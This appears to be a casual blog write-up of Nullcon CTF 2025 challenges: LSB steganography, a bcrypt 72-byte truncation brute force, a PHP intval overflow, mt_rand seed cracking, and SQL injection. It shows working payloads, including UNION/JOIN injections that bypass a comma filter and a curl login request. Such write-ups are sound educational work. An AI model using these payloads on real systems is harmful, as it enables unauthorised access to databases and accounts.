---
title: "Nullcom CTF 2025"
date: 2025-02-02T22:22:00+08:00
description: "camellia - speedrun"
categories: CTF
---

dude i was doing ECTF prior to this and didnt see this ctf coming up literally hours after\
i was wondering why i dont see big names on ECTF leaderboard but after solving i realized the reason was chals were abysmally bad there\
i sacrificed a good(?) ctf for a garbage ctf ts pmo

so anyways this became a "how many chals can i solo solve in 4 hours" challenge! (it was 9)\
just kidding i focused on web (some chals im too lazy to explain)

# misc
## Profound thought
we're given an image named `l5b245c11.png`, which is just **LSB to ASCII** in leet\
[doing so](https://stylesuxx.github.io/steganography/) reveals that the image is embedded fully with the flag **`ENO{57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy}`**

# web
## Bfail
> To 'B' secure or to 'b' fail? Strong passwords for admins are always great, right?

### analyzing
to get through the login, we need to pass 3 checks:
- username needs to be `admin`
- length of password is less than 128
- password must match **admin's hashed password** through bcrypt

for the last check, we can see a very clear hint in the source code:
```py
# This is super strong! The password was generated quite securely. Here are the first 70 bytes, since you won't be able to brute-force the rest anyway...
# >>> strongpw = bcrypt.hashpw(os.urandom(128),bcrypt.gensalt())
# >>> strongpw[:71]
# b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'
app.ADMIN_PW_HASH = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'
```

well, we need to bruteforce, but how?\
let's check the [documentation for bcrypt](https://github.com/pyca/bcrypt):
> **Maximum Password Length**\
> The bcrypt algorithm only handles passwords up to **72 characters**, any characters beyond that are **ignored**.

### payload
since we know the first 71 characters, we only need to brute for the last character, which shouldn't be a problem!
{{< code language="py" source="code/bfail.py" >}}
submitting the form we can realize POST requests are invalid, and that it only accepts GET requests from source\
so let's curl instead:
```
curl -X GET "http://52.59.124.14:5013/" \
> -H "Content-Type: application/x-www-form-urlencoded" \
> -d "username=admin&password=%EC%9F%E0a%978%FC%B6%3AT%E2%A0%C9%3C%9E%1A%A5%FAo%B2%15%86%E5%24%86Z%1A%D4%CA%23%15%D2x%A0%0E0%CA%BC%89T%C5V6%F1%A4%A8S%8A%25I%D8gI%15%E9%E7%24M%15%DC%40%A9%A1%40%9C%EEe%E0%E0%F76%AA"
```
> Congrats! It appears you have successfully bf'ed the password. Here is your **`ENO{BCRYPT_FAILS_TO_B_COOL_IF_THE_PW_IS_TOO_LONG}`**

## Numberizer
we need to input 4 integers with minimum length 4 that sums up to be negative\
```php
if(!isset($_POST['numbers'][$i]) || strlen($_POST['numbers'][$i])>4 || !is_numeric($_POST['numbers'][$i])) {
    continue;
}
$the_number = intval($_POST['numbers'][$i]);
if($the_number < 0) {
    continue;
}
```
as our inputs must be a number and cannot be negative, i thought of integer overflowing into the negatives\
conveniently php allows us to use scientific notations for large integers, like `9e99`\
that's already enough for 64-bit maximum! after inputting, we get:
> You win a flag: **`ENO{INTVAL_IS_NOT_ALW4S_P0S1TiV3!}`**

## Sess.io
we sign up and we get a randomized token with part of flag as seed, choosing 1 of the 38 characters\
a simple search gives us [this tool](https://github.com/openwall/php_mt_seed), and so i generated the input to the solver:\
```py
alpha = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
session = '8bwxvicb2ogv1_3akeawjg...' #you only need like 20 or so characters

res = ''
for c in session:
	res += f'{alpha.find(c)} {alpha.find(c)} 0 {str(len(alpha)-1)}'
print(res)
```
the segment we get depends on the 1st char of name + password, so we need to brute for each number:
| flag | token | name+password | md5 1st |
| ---- | ----- | ------------- | ------- |
| `ENO{` | `8bwx..` | `loveofthesun` | 0 |
| `SOME` | `sc_0..` | `sadhappiness` | 1 |
| `_SUP` | `g1c..` | `darklight` | 2 |
| `ER_S` | `0po4..` | `nothingsleft` | 3 |
| `ECUR` | `9fvv..` | `lovenot` | 4 |
| `E_FL` | `thw9343..` | `stopgo` | 5 |
| `AG_1` | `8esm..` | `wedigress` | 6 |
| `3333` | `d5k2..` | `stoppeace` | 7 |
| `37_H` | `u78..` | `rightwrong` | 8 |
| `ACK}` | `a-jt..` | `soundsilence` | 9 |
concatenated we get **`ENO{SOME_SUPER_SECURE_FLAG_1333337_HACK}`**

## Paginator
we can send queries to a sqlite database through the URL\
doing a source looky, we can sense a sql injection as our inputs are directly inserted inside:
```php
$q = "SELECT * FROM pages WHERE id >= $min AND id <= $max"; 
```
so lets just inject `1=1` to make the statement always true!\
`?p=2,10+OR+1=1` gives us our flag with ID 1:\
> Flag (ID=1) has content: **"RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvdyF9"**\
decoding from b64, we get **`ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow!}`**

## Paginator 2
now our flag is at another table!\
to peek another table we can use UNION to execute extra queries, which we can use to leak the table name\
...except i guessed the table name `flag` instead by `?p=2,10+UNION+SELECT+*+FROM+flag`
> Flag (ID=1) has content: **"RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvd19BZ0Exbl9BbmRfQWc0MW4hfQ=="**\
but how do we solve it without guessing?

### doing it the Right way
naively i did `UNION SELECT * FROM sqlite_master`, but the server threw this error:\
`Fatal error: Uncaught Error: Call to a member function fetchArray() on **false** in /var/www/html/index.php`\
our query errored it returned a false boolean instead... why?

notice the number of columns in both tables:\
- from part 1 we know pages has **(id, title, content)**\
- sqlite_master has **(type, name, tbl_name, rootpage, sql)**\
as UNION query combines our tables into one single result, both table must have same number of columns, but our query doesn't

but can we use commas to select specific columns instead?\
no, because the server splits our queries by commas\
and even if that worked, we will end up returning 3+ things, and the server only gets first 2 values:
```php
[$min, $max] = explode(",",$_GET['p']);
```

referring to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md#no-comma-allowed), we can use JOIN to create a "custom table" that has 3 columns including the table names\
`?p=2,10+UNION+SELECT+*+FROM+(SELECT+id+FROM+pages)+JOIN+(SELECT+title+FROM+pages)+JOIN+(SELECT+name+FROM+sqlite_master)`\
(note that you can't ask for table names in 1st field because field types must match)

doing so gives a b64 string decoding to **`ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow_AgA1n_And_Ag41n!}`**